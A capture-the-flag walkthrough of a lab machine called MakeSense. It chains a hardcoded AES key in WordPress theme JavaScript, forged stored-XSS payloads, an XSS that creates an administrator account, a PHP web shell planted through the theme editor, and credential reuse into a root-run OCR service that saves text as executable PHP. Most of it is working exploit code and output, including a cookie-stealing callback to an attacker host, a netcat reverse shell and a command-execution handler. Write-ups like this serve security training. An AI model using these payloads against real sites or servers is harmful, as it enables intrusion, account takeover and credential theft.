# MakeSense

## Reconnaissance

Command:

```bash
nmap -sV -sC -T4 <target_ip>
```

*Why:* baseline service/version scan to see what's exposed and worth attacking.

The scan reveals SSH (22) and HTTPS (443). Ports 80 and 8001 are filtered — not reachable externally, but worth remembering (8001 becomes the root path).

```text
22/tcp   open     ssh      OpenSSH 9.6p1 Ubuntu
80/tcp   filtered http
443/tcp  open     ssl/http Apache httpd 2.4.58
8001/tcp filtered vcom-tunnel
```

The TLS certificate CN is `makesense.htb`, so add it to `/etc/hosts`:

```bash
echo "<target_ip> makesense.htb" | sudo tee -a /etc/hosts
```

*Why:* the vhost and its TLS cert are bound to the hostname; the raw IP won't serve the site correctly.

---

## Enumerate the Web Application

Navigating to `https://makesense.htb` reveals a WordPress site ("Agency LLC") on a custom theme, `webagency`. The homepage source exposes a custom voice-transcription ("whisper") feature wired to WordPress AJAX:

```html
<script id="whisper-wrapper-js-extra">
var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"85e6eda673","theme_url":"https://makesense.htb/wp-content/themes/webagency","site_url":"https://makesense.htb"};
</script>
<script id="whisper-wrapper-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"></script>
```

*Why:* custom theme features are where non-standard (and often weak) code lives. The embedded public `nonce` and the custom JS file are both leads.

---

## Source Analysis of whisper-wrapper.js

Fetch the theme's whisper script:

```bash
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

*Why:* client-side JS on a custom feature frequently leaks how the backend validates requests — and sometimes secrets.

The file records audio, runs an in-browser Whisper model, encrypts the result, and POSTs it to WordPress. The critical finding is a **hardcoded symmetric encryption key** shipped to every visitor:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

async encryptPayload(payload) {
    const keyMaterial = await crypto.subtle.digest('SHA-256', encoder.encode(ENCRYPTION_KEY));
    const key = await crypto.subtle.importKey('raw', keyMaterial, { name: 'AES-GCM' }, false, ['encrypt']);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, data);
    // combined = IV + ciphertext, base64 encoded
}
```

*Why it matters:* AES-GCM is strong, but a symmetric key is only protective while secret. Shipped in public JS, it lets anyone encrypt arbitrary payloads exactly as the real page does — the "encryption" becomes no barrier at all.

---

## Forge an Encrypted Payload (Stored XSS)

The encryption is reproduced in Python:

```python
import hashlib, os, json, base64, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ENCRYPTION_KEY = b'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

def encrypt_payload(transcription, summary):
    key = hashlib.sha256(ENCRYPTION_KEY).digest()
    aesgcm = AESGCM(key)
    iv = os.urandom(12)
    data = json.dumps({"transcription": transcription, "summary": summary}).encode()
    ct = aesgcm.encrypt(iv, data, None)
    return base64.b64encode(iv + ct).decode()

xss = sys.argv[1]
print(encrypt_payload(xss, xss))
```

*Why:* replicating the exact scheme (SHA-256 of the key → AES-256-GCM → `IV + ciphertext`, base64) lets us submit server-accepted payloads without the browser or a microphone.

Generate a proof-of-concept XSS blob:

```bash
python3 encryptpayload.py '<script>fetch("http://<attacker_ip>:8000/c?c="+btoa(document.cookie))</script>'
```

*Why:* a cheap callback payload to confirm our injected text actually executes in someone's browser before investing in a real exploit.

The submission is two AJAX actions. First upload a dummy WAV to create a post:

```bash
NONCE=$(curl -sk https://makesense.htb/ | grep -oP '"nonce":"\K[a-f0-9]+')
echo -n "RIFF" > dummy.wav
curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_raw" -F "nonce=$NONCE" \
  -F "voice_recording=@dummy.wav;type=audio/wav"
```

*Why:* the workflow requires an audio upload to mint a `post_id` to attach results to; the WAV content is irrelevant, only the forged payload that follows matters.

```json
{"success":true,"data":{"message":"Audio saved, processing started.","post_id":69}}
```

Then attach the forged encrypted payload to that post:

```bash
curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_results" -F "nonce=$NONCE" \
  -F "post_id=69" -F "encrypted_payload=<blob.txt"
```

*Why:* the server only checks the public nonce and that the blob decrypts — it never verifies a real recording, nor sanitises the stored text, giving stored XSS.

```json
{"success":true,"data":{"message":"Results saved successfully!","post_id":69}}
```

A listener (`python3 -m http.server 8000`) soon receives a callback from the box, confirming the transcription text is rendered unsanitised in an admin context — **stored XSS executing in the admin's session**.

---

## Escalate XSS to a New Administrator

The exfiltrated cookie decodes only to `wp-settings-time-*` — the session cookie is `HttpOnly`, so theft is a dead end. Instead, the payload abuses the admin's own authenticated session to create a new administrator. The JS scrapes a session-bound nonce from `user-new.php`, then POSTs a new admin account:

```javascript
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{
  const nonce=t.match(/name="_wpnonce_create-user" value="([a-f0-9]+)"/)[1];
  const referer=t.match(/name="_wp_http_referer" value="([^"]+)"/)[1];
  const body=new URLSearchParams();
  body.append('action','createuser');
  body.append('_wpnonce_create-user',nonce);
  body.append('_wp_http_referer',referer);
  body.append('user_login','h3rm1t');
  body.append('email','h3rm1t@evil.com');
  body.append('pass1','P4ssw0rd!2026');
  body.append('pass2','P4ssw0rd!2026');
  body.append('role','administrator');
  return fetch('/wp-admin/user-new.php',{method:'POST',body});
});
```

*Why:* since the code runs inside the admin's session it inherits their authority. It must fetch a fresh `_wpnonce_create-user` first because WordPress ties that nonce to the requesting session — effectively CSRF driven through XSS.

This JS is encrypted with the same script and submitted via `save_voice_results` against the active post. After the admin's browser processes it, log in with the new account:

```bash
curl -sk -X POST https://makesense.htb/wp-login.php \
  --data-urlencode 'log=h3rm1t' \
  --data-urlencode 'pwd=P4ssw0rd!2026' \
  --data-urlencode 'wp-submit=Log In' \
  --data-urlencode 'redirect_to=https://makesense.htb/wp-admin/' \
  --data-urlencode 'testcookie=1' \
  -c cookies.txt -b "wordpress_test_cookie=WP+Cookie+check" -L -o login_response.html

grep -i "wordpress_logged_in" cookies.txt
```

*Why:* confirms the planted account is real and usable; a `wordpress_logged_in_*` cookie for `h3rm1t` means we now hold a genuine admin session over curl.

---

## Admin to RCE via Theme File Editor

As administrator, the Theme File Editor is enabled and theme files are writable. The editor saves through `admin-ajax.php` (action `edit-theme-plugin-file`) using a form nonce rendered on the editor page — grab it fresh and write a command handler into `index.php` of the active theme:

```bash
N=$(curl -sk -b cookies.txt "https://makesense.htb/wp-admin/theme-editor.php?file=index.php&theme=webagency" \
    | grep -oP 'name="nonce" value="\K[a-f0-9]+')

curl -sk -b cookies.txt "https://makesense.htb/wp-admin/admin-ajax.php" \
  --data-urlencode "action=edit-theme-plugin-file" \
  --data-urlencode "nonce=$N" \
  --data-urlencode "theme=webagency" \
  --data-urlencode "file=index.php" \
  --data-urlencode 'newcontent=<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>'
```

*Why:* an admin who can edit theme PHP can plant server-side code. `index.php` is chosen because it is directly reachable by URL and always executed, so the injected `?c=` handler can be triggered on demand.

```json
{"success":true,"data":{...}}
```

Trigger the handler:

```bash
curl -sk -b cookies.txt "https://makesense.htb/?c=id"
```

*Why:* loading the theme runs our injected PHP, turning the edit into command execution.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Reverse Shell as www-data

Start a listener:

```bash
nc -lvnp 8888
```

Fire a named-pipe reverse shell through the handler:

```bash
curl -sk -b cookies.txt "https://makesense.htb/" --get \
  --data-urlencode "c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker_ip> 8888 >/tmp/f"
```

*Why:* the one-shot `?c=` handler is awkward for enumeration; a FIFO-based reverse shell gives a stable, interactive session. Stabilise it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

---

## www-data to walter (Credential Reuse)

The WordPress config is readable by the web user. Although it runs on SQLite (the MySQL fields are labelled "dummy"), a real password sits in them:

```bash
cat /var/www/html/wp-config.php
```

*Why:* web apps must let their runtime user read DB credentials; "dummy" or unused config values are still worth reading because developers reuse real passwords in them.

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

`walter` is a real system user, and the "dummy" DB password is reused for his account:

```bash
ssh walter@makesense.htb
# password: JbhHDAEgXvri3!
```

*Why:* testing a found password against every account/service is the first move once credential reuse is plausible — here it unlocks SSH.

---

## Retrieve User Flag

```bash
cat /home/walter/user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Identify a Root-Owned Internal Service

`walter` has no sudo rights and no unusual SUID binaries. Local port enumeration reveals a service bound to loopback on 8001 — the port that was filtered externally during recon:

```bash
ss -tlnp
```

*Why:* services bound to `127.0.0.1` are invisible from outside but reachable now that we're on the host — a classic internal attack surface, and this matches the filtered 8001 from nmap.

```text
LISTEN 127.0.0.1:8001
LISTEN 0.0.0.0:443
LISTEN 0.0.0.0:22
```

The process runs as **root**, out of a root-only directory, served by PHP's built-in server:

```bash
ps aux | grep 8001
```

*Why:* the owning user sets the stakes — a service running as root means any flaw in it yields root.

```text
root 1393 ... php -S 127.0.0.1:8001 -t /root/ocr4/
```

---

## Authenticate to the OCR Service

The service is gated by HTTP Basic Auth (`realm="OCR Protected"`). Walter's password is reused a third time:

```bash
curl -s -u "walter:JbhHDAEgXvri3!" http://127.0.0.1:8001/ -i | head -5
```

*Why:* having already seen this password reused twice, the first hypothesis for any new auth prompt is the same credential.

```text
HTTP/1.1 200 OK
X-Powered-By: PHP/8.3.6
```

The tool is an OCR app: draw text on a canvas, submit it as a base64 PNG (`canvas_image`), and it returns the recognised text with a form to save it under a chosen filename.

---

## Test the Save Primitive

The save form posts `ocr_id` + `filename` + `save_output`. The `ocr_id` is bound to the PHP session that produced it, so submit and save must share one cookie jar:

```bash
php -r '$im=imagecreatetruecolor(600,120);$w=imagecolorallocate($im,255,255,255);$b=imagecolorallocate($im,0,0,0);imagefilledrectangle($im,0,0,600,120,$w);imagestring($im,5,240,50,"HELLO",$b);imagepng($im,"/tmp/t.png");'
B64=$(base64 -w0 /tmp/t.png)

curl -s -u "walter:JbhHDAEgXvri3!" -c jar.txt -b jar.txt http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$B64" -o r.html
OCR=$(grep -oP 'name="ocr_id" value="\K[^"]+' r.html)

curl -s -u "walter:JbhHDAEgXvri3!" -c jar.txt -b jar.txt http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=$OCR" --data-urlencode "filename=poc.txt" \
  --data-urlencode "save_output=Save" -o s.html
grep -iE "saved as|notice" s.html
```

*Why:* establishes the save primitive works and persists the same session so the `ocr_id` stays valid; a successful `.txt` save under `saved/` is the baseline before changing one variable at a time.

```text
Saved as: saved/poc.txt
```

Testing the two defences: path traversal (`../trav.txt`) is stripped to its basename, but the **file extension is not filtered** — `test.php` saves as `saved/test.php`. Since `saved/` sits under a PHP docroot served as root, a `.php` file there executes as root.

*Why it matters:* traversal being blocked is irrelevant — `saved/` is already inside the root-run PHP docroot, so an unrestricted extension is all that's needed to drop executable code as root.

---

## OCR-to-PHP: Render a Payload the Service Reads Correctly

The saved file's content is whatever Tesseract reads from the image, so the PHP must OCR cleanly. Using DejaVu Sans Mono Bold on a wide, short canvas (and dropping the `?>` tag to avoid fragmentation):

```bash
cat > /tmp/gen.php <<'EOF'
<?php
$txt = $argv[1];
$font = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf";
$im = imagecreatetruecolor(2000, 120);
$white = imagecolorallocate($im, 255, 255, 255);
$black = imagecolorallocate($im, 0, 0, 0);
imagefilledrectangle($im, 0, 0, 2000, 120, $white);
imagettftext($im, 44, 0, 20, 80, $black, $font, $txt);
imagepng($im, "/tmp/payload.png");
EOF

php /tmp/gen.php '<?php system("id");'
tesseract /tmp/payload.png stdout --psm 6
```

*Why:* the attacker never types the file contents directly — the OCR engine does. A crisp monospace render and verifying locally with the service's own `--psm 6` ensures the recognised text is valid PHP before submitting.

```text
<?php system("id");
```

---

## Execute as Root and Dump the Flag

Submit the verified image, save it as `.php`, and request it:

```bash
B64=$(base64 -w0 /tmp/payload.png)
curl -s -u "walter:JbhHDAEgXvri3!" -c jar.txt -b jar.txt http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$B64" -o r.html
OCR=$(grep -oP 'name="ocr_id" value="\K[^"]+' r.html)
curl -s -u "walter:JbhHDAEgXvri3!" -c jar.txt -b jar.txt http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=$OCR" --data-urlencode "filename=shell.php" \
  --data-urlencode "save_output=Save" -o s.html
curl -s -u "walter:JbhHDAEgXvri3!" -b jar.txt http://127.0.0.1:8001/saved/shell.php
```

*Why:* saving the OCR'd PHP into the root-served `saved/` directory and requesting it runs the code as the root-owned PHP process.

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## Retrieve Root Flag

Render `<?php system("cat /root/root.txt");` through the same pipeline, save as `flag.php`, and request it:

```bash
php /tmp/gen.php '<?php system("cat /root/root.txt");'
# submit + save as flag.php, then:
curl -s -u "walter:JbhHDAEgXvri3!" -b jar.txt http://127.0.0.1:8001/saved/flag.php
```

*Why:* one exact command per image keeps OCR reliable; reading the flag runs as root like any other command here.

The root flag is successfully obtained.

---

# Attack Chain

```text
Nmap → WordPress (webagency theme) on 443, port 8001 filtered →
Hardcoded AES-GCM key in whisper-wrapper.js → forge encrypted payloads →
Stored XSS in admin session (HttpOnly blocks cookie theft) →
XSS creates new administrator (h3rm1t) → admin login →
Theme File Editor writes PHP into index.php → RCE as www-data →
wp-config.php "dummy" DB password reused → SSH as walter (user flag) →
Root-owned OCR service on 127.0.0.1:8001 → walter's password reused again →
No extension filter on save + OCR-as-file-content → write shell.php, executed as root →
Root flag
```